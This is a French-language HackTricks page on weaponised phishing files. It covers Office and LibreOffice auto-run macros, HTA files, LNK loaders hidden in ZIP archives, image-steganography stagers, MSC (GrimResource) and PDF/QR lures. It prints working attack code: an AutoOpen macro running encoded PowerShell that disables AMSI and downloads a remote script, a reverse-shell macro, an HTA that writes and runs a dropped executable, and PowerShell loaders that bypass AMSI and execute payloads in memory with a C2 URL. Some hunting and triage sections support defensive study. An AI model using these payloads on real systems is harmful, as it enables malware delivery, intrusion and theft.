# Fichiers et documents de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documents Office

Microsoft Word effectue une validation des données du fichier avant de l’ouvrir. La validation des données est effectuée sous la forme d’une identification de la structure des données, conformément à la norme OfficeOpenXML. Si une erreur survient lors de l’identification de la structure des données, le fichier analysé ne sera pas ouvert.

Habituellement, les fichiers Word contenant des macros utilisent l’extension `.docm`. Cependant, il est possible de renommer le fichier en modifiant son extension tout en conservant ses capacités d’exécution de macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros, par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes composants internes et mécanismes s’appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX faisant référence à un modèle distant (Fichier –Options –Compléments –Gérer : Modèles –Atteindre) qui inclut des macros peuvent également « exécuter » des macros.

### Chargement d’image externe

Allez dans : _Insérer --> Quick Parts --> Champ_\
_**Catégories** : Liens et références, **Noms de champs** : includePicture, et **Nom de fichier ou URL** :_ http://<ip>/whatever

![Documents Office - Chargement d’image externe : allez dans : Insérer -- Quick Parts -- Champ](<../../images/image (155).png>)

### Backdoor de macros

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions à chargement automatique

Plus elles sont courantes, plus il est probable que l’AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Supprimer manuellement les métadonnées

Allez dans **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira l’inspecteur de document. Cliquez sur **Inspect**, puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Extension du document

Une fois terminé, sélectionnez la liste déroulante **Save as type** et remplacez le format **`.docx`** par **Word 97-2003 `.doc`**.\
Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu’il existe une **stigmatisation** **autour** de l’extension **`.docm`** compatible avec les macros (par exemple, l’icône de miniature comporte un énorme `!`, et certaines passerelles web/e-mail les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` constitue le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros auto-exécutées LibreOffice ODT (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement lorsque le fichier est ouvert, en associant la macro à l’événement **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Une simple macro de reverse shell ressemble à ceci :
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Notez les guillemets doublés (`""`) à l'intérieur de la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Ainsi, les payloads qui se terminent par `...==""")` conservent à la fois la commande interne et l'argument de Shell correctement équilibrés.

Conseils de livraison :

- Enregistrez le fichier au format `.odt` et associez la macro à l'événement du document afin qu'elle s'exécute immédiatement à l'ouverture.
- Lors de l'envoi avec `swaks`, utilisez `--attach @resume.odt` (le caractère `@` est requis pour que les octets du fichier, et non la chaîne correspondant au nom du fichier, soient envoyés en pièce jointe). Ceci est essentiel lors de l'abus de serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.

## HTA Files

Un HTA est un programme Windows qui **combine HTML et des langages de scripting (tels que VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute comme une application bénéficiant d'une « confiance totale », sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d'IE**. S'il a été désinstallé, les HTA ne pourront donc pas s'exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM « à distance »**. Par exemple, vous pouvez ajouter des **images invisibles** aux e-mails ou au HTML auxquels l’utilisateur accédera (même via un MitM HTTP ?). Vous pouvez également envoyer à la victime l’**adresse de fichiers** qui **déclencheront** une **authentification** dès l’**ouverture du dossier**.

**Consultez ces idées et bien d’autres dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N’oubliez pas que vous pouvez non seulement voler le hash ou l’authentification, mais aussi **effectuer des attaques NTLM relay** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (chaîne fileless)

Les campagnes très efficaces distribuent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) ainsi qu’un fichier .lnk malveillant. L’astuce consiste à stocker le loader PowerShell réel dans les octets bruts du ZIP après un marqueur unique, puis à permettre au .lnk de l’extraire et de l’exécuter entièrement en mémoire.<sup>[[2]](#references)</sup>

Flux typique implémenté par le one-liner PowerShell du .lnk :

1) Localiser le ZIP original dans les chemins courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData% et le dossier parent du répertoire de travail actuel.
2) Lire les octets du ZIP et rechercher un marqueur codé en dur (par exemple, xFIQCV). Tout ce qui suit le marqueur constitue le payload PowerShell intégré.
3) Copier le ZIP vers %ProgramData%, l’extraire à cet emplacement et ouvrir le fichier .docx leurre pour donner une apparence légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Désobfusquer l’étape suivante (par exemple, supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell permettant d’extraire et d’exécuter l’étape intégrée :
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- La livraison abuse souvent de sous-domaines PaaS réputés (p. ex., *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins selon l’adresse IP/l’UA).
- L’étape suivante déchiffre fréquemment du shellcode encodé en base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire les artefacts sur le disque.

Persistence utilisée dans la même chaîne
- Détournement de COM TypeLib du contrôle Microsoft Web Browser afin qu’IE/Explorer, ou toute application qui l’intègre, relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Consultez les détails et les commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Fichiers ZIP contenant la chaîne marqueur ASCII (p. ex., xFIQCV) ajoutée aux données de l’archive.
- Fichier .lnk qui énumère les dossiers parent/utilisateur pour localiser le ZIP et ouvre un document leurre.
- Altération d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## Staging de type LNK decoy-first → persistence via tâche planifiée → side-loading d’un CPL de confiance

Un autre schéma récurrent est un **`.lnk` imitant un document** qui ouvre immédiatement un leurre bénin tout en préparant la chaîne réelle en arrière-plan.<sup>[[3]](#references)</sup>

Workflow observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe`, ou un proxy similaire, pour lancer un downloader PowerShell obfusqué.
2. PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), de sorte que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne détectent pas la commande.
3. Le stager télécharge **d’abord le document leurre**, l’ouvre pour la victime, puis reconstruit les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **extensions factices**, puis renommés en supprimant les caractères de remplissage, ce qui retarde l’apparition d’artefacts `.exe` / `.cpl` évidents.
5. La persistence est établie avec une **tâche planifiée basée sur les minutes** qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.

Indices minimaux de hunting pour ce schéma :
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Pourquoi la deuxième étape est furtive

Dans l'étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était placé à ses côtés et exportait **`RunFODW`**, le binaire Microsoft de confiance chargeait par side-loading le CPL de l'attaquant au lieu de la copie système légitime.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et y copie le shellcode déchiffré
- L'exécute indirectement en passant le pointeur du shellcode comme callback pour **`EnumUILanguagesW`**

Cette dernière étape mérite une recherche distincte : les malwares évitent souvent un saut direct de type `((void(*)())buf)()` et abusent plutôt d'une **WinAPI légitime acceptant un callback** pour transférer l'exécution.

Le payload déchiffré de cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus actuel avant de transférer l'exécution. Pour des notes plus approfondies sur le side-loading et le post-traitement résident en mémoire, voir :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivots de recherche pratiques :
- Un `.lnk` lançant `powershell.exe` ou `conhost.exe`, suivi d'un document leurre visible.
- Des téléchargements de courte durée vers **`C:\Users\Public\`**, suivis de renommages immédiats depuis des extensions fantaisistes.
- Des tâches planifiées portant des noms banals tels que `GoogleErrorReport` et exécutées depuis des **répertoires accessibles en écriture par l'utilisateur**.
- Des binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Des blobs texte encodés en Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé par side-loading.

## Payloads délimités par stéganographie dans des images (PowerShell stager)

Les chaînes de loader récentes distribuent un JavaScript/VBS obfusqué qui décode et exécute un PowerShell stager encodé en Base64. Ce stager télécharge une image (souvent un GIF) contenant une DLL .NET encodée en Base64 et dissimulée sous forme de texte brut entre des marqueurs de début et de fin uniques. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte intermédiaire, le décode en Base64 pour obtenir des octets, charge l'assembly en mémoire et invoque une méthode d'entrée connue avec l'URL C2.<sup>[[5]](#references)</sup>

Workflow
- Étape 1 : Dropper JS/VBS archivé → décode le Base64 intégré → lance le PowerShell stager avec -nop -w hidden -ep bypass.
- Étape 2 : PowerShell stager → télécharge l'image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par exemple, VAI) en lui transmettant l'URL C2 et les options.
- Étape 3 : Le loader récupère le payload final et l'injecte généralement via du process hollowing dans un binaire de confiance (couramment MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Voir ici plus d'informations sur le process hollowing et l'exécution proxy via des utilitaires de confiance :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL d'une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et loader de payload stego PowerShell</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- Il s’agit de l’ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Les marqueurs varient selon les campagnes.
- L’AMSI/ETW bypass et la désobfuscation des chaînes sont généralement appliqués avant le chargement de l’assembly.
- Hunting : analyser les images téléchargées à la recherche de délimiteurs connus ; identifier PowerShell accédant à des images et décodant immédiatement des blobs Base64.

Voir également les outils de stego et les techniques de carving :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging de PowerShell Base64

Une étape initiale récurrente consiste en un petit fichier `.js` ou `.vbs` fortement obfusqué, distribué dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` afin d’amorcer l’étape suivante via HTTPS.<sup>[[5]](#references)</sup>

Logique schématique (abstraite) :
- Lire le contenu de son propre fichier
- Localiser un blob Base64 entre des chaînes parasites
- Décoder en PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Indicateurs de hunting
- Pièces jointes JS/VBS archivées lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis des chemins temporaires utilisateur.

## Documents MSC comme conteneurs d’exécution (GrimResource)

Les fichiers Microsoft Management Console (`.msc`) sont des définitions de console XML normalement ouvertes par `mmc.exe`. **GrimResource** weaponizes une référence `StringTable` vers une ressource `apds.dll` contenant une ancienne primitive XSS ; ainsi, lorsqu’un utilisateur ouvre la console conçue à cet effet, du JavaScript s’exécute à l’intérieur de `mmc.exe`. Les échantillons observés combinaient une obfuscation fondée sur `transformNode` avec **DotNetToJScript** afin d’instancier un payload .NET sans passer par le chemin habituel des macros Office.<sup>[[9]](#references)</sup>

Pour le triage statique, traiter un MSC non fiable comme du texte et **ne pas double-cliquer dessus** :<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
Les pivots runtime à forte valeur de signal sont `mmc.exe` qui charge le CLR ou des composants de script, crée des connexions réseau ou lance `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou un exécutable inattendu. Le format étant légitime, les détections doivent corréler **l'origine + le contenu XML/script suspect + le comportement de `mmc.exe`** au lieu de bloquer tous les fichiers MSC.<sup>[[9]](#references)</sup>

## Redirections PDF/QR et filtrage des payloads

Un PDF n'a pas besoin d'un exploit pour être utile. Des campagnes récentes placent un **code QR ou un lien ordinaire** dans un document à l'apparence légitime, redirigent la session du navigateur en dehors des contrôles de messagerie et personnalisent la destination avec l'adresse du destinataire. Microsoft a documenté en 2025 des PDF dont les URL QR étaient uniques pour chaque destinataire et menaient vers une infrastructure de vol d'identifiants RaccoonO365 ; une chaîne parallèle utilisait un filtrage selon l'adresse IP et l'environnement pour renvoyer un chemin JavaScript/MSI à certains visiteurs, mais un PDF inoffensif aux scanners ou aux clients non autorisés.<sup>[[10]](#references)</sup>

Triez à la fois les actions des PDF et les codes QR rendus. Un QR peut être dessiné sous forme vectorielle plutôt qu'être stocké comme une image extractible ; rasterisez donc chaque page en plus d'extraire les images intégrées :
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
Inspectez les destinations décodées et les redirections depuis un système d’analyse isolé sans vous authentifier. Les éléments utiles pour le hunting incluent des PDF contenant uniquement un QR code avec des corps d’e-mails presque vides, l’adresse e-mail du destinataire intégrée dans un paramètre de requête, plusieurs redirections via des hébergeurs réputés, ainsi que du contenu différent renvoyé selon l’adresse IP, la géolocalisation, les cookies, le referrer ou le user agent. Comparez les requêtes avec des profils contrôlés, car un seul fetch de sandbox peut ne recevoir que le leurre.<sup>[[10]](#references)</sup>

## Fichiers Windows permettant de voler des hashes NTLM

Consultez la page sur les **endroits où voler des credentials NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant les entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode : suivi du tradecraft de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Le loader PhantomVAI distribue plusieurs infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Stéganographie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Exécution par proxy via des utilitaires de développeur approuvés : MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource : Microsoft Management Console pour l’accès initial et l’évasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Des acteurs de la menace tirent parti de la saison fiscale pour déployer des campagnes de phishing sur le thème des impôts](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
